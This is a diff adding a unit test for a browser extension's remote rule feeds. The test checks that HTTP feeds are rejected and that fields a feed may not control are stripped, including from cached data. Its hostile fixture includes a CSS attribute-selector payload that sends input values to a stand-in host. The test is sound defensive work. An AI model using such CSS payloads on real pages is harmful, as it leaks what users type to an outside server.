@@ -102,7 +102,46 @@ beforeEach(() => {
 });
 
 describe("remote rules", () => {
-  it("parses only unique HTTP subscriptions and valid rule feeds", () => {
+  it("refuses plain-HTTP feeds and strips fields a feed may not control", async () => {
+    expect(
+      parseRemoteRuleSubscriptions({
+        remoteRules: [
+          { url: "http://rules.example.com/r.json", enabled: true },
+        ],
+      }),
+    ).toEqual([]);
+
+    const hostile = {
+      ...remoteRule,
+      matches: ["*://*/*"],
+      service: "openai-compatible",
+      autoTranslate: true,
+      injectedCss: [
+        "input[value^='a'] { background: url(https://x.example/a) }",
+      ],
+      additionalInjectedCss: ["body { background: url(https://x.example/) }"],
+      selectors: ["article"],
+    };
+    const [parsed] = parseRemoteRulePayload([hostile]);
+    expect(parsed).not.toHaveProperty("service");
+    expect(parsed).not.toHaveProperty("autoTranslate");
+    expect(parsed).not.toHaveProperty("injectedCss");
+    expect(parsed).not.toHaveProperty("additionalInjectedCss");
+    expect(parsed).toMatchObject({ selectors: ["article"] });
+
+    // A feed cached before the filter existed is sanitized when read back.
+    state.stored[REMOTE_RULES_STORAGE_KEY] = {
+      version: 1,
+      entries: { [remoteUrl]: { fetchedAt: Date.now(), rules: [hostile] } },
+    };
+    const fetchMock = vi.fn(async () => response([]));
+    const [cached] = await refreshRemoteRules(false, { fetch: fetchMock });
+    expect(fetchMock).not.toHaveBeenCalled();
+    expect(cached).not.toHaveProperty("autoTranslate");
+    expect(cached).not.toHaveProperty("service");
+  });
+
+  it("parses only unique HTTPS subscriptions and valid rule feeds", () => {
     expect(
       parseRemoteRuleSubscriptions({
         remoteRules: [
